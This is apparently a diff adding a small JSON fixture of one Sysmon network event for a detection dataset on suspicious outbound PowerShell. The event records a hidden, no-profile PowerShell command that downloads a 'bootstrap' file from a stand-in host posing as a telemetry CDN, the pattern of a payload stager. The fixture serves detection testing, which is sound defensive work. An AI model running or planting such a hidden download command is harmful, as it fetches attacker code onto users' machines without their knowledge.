@@ -1,0 +1,18 @@
+{
+  "datasetId": "suspiciousOutboundPowerShell",
+  "events": [
+    {
+      "timestamp": "2026-04-20T15:00:41Z",
+      "Computer": "ENG-WS-018",
+      "User": "ENG\\k.choi",
+      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+      "CommandLine": "powershell.exe -nop -w hidden Invoke-WebRequest https://telemetry-cdn-sync.example/bootstrap",
+      "DestinationIp": "93.184.216.34",
+      "DestinationHostname": "telemetry-cdn-sync.example",
+      "EventID": 3,
+      "ProviderName": "Microsoft-Windows-Sysmon"
+    }
+  ]
+}
+
